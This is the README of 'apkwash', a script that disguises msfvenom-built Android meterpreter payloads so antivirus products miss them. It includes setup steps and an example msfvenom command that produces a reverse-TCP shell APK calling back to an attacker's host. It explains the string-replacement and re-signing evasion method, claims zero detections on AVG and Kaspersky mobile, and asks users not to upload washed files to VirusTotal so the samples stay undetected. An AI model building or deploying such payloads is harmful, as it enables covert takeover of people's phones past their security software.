# apkwash
Android APK Antivirus evasion for msfvenom generated payloads.
<br><br>
<b> -- Please do not upload "washed" files to VirusTotal.com -- </b><br>
<br>
<br>
<b> Tested on Kali linux rolling. </b><br>
<br>
<br>
<b>Setup:</b><br>
apt-get update && apt-get upgrade<br>
chmod +x apkwash<br>
mv apkwash /usr/local/bin/.<br>
<br>
<b>On first run:</b><br>
-Downloads and places apktool.jar in the user's /usr/local/bin directory<br>
-Generates debug keystore for signing. Places it in ~/.android/<br>
<b>NOTE:</b> If wanting to customize each signature, then remove the keystore before running the script.<br>
<br>
<b>Usage:</b><br>
apktool \<payload>.apk<br>
<br>
<b>Input:</b><br>
This script takes a msfgenerated payload as input.<br>
Ex: msfvenom -p android/meterpreter/reverse_tcp LHOST=\<IP> LPORT=\<PORT> -o \<payload>.apk<br>
<br>
<b>Output:</b><br>
washed_\<payload>.apk<br>
<br>
<b>Antivirus detection:</b><br>
0/35 on nodistribute - 16Feb17<br>
Verified for AVG mobile<br>
Verified for Kaspersky mobile<br>
<br>
<b>Modifiations</b><br>
Feel free to open the script and make improvements. This script basically utilizes APKTool to open the package, uses sed to replace strings that flag AV, recompiles, then signs.<br>
<br>
<br>
<b>Files</b><br>
/tmp/payload    (Main files to review: AndroidManifest.xml and the smali files)
<br>
<br>
<b>Debugging</b><br>
Comment out the removal of the /tmp/payload directory to see the file structure that was compiled.<br><br><br>
<b>If you are seeing other "Payload".smali files in /tmp/payload/smali/com/var1/var2/ then be sure you have an updated system. I have found an older msfvenom version output a different payload that will be flagged by AVG (1/35 on nodistribute). Just making sure you are completely updated should resolve this.</b>
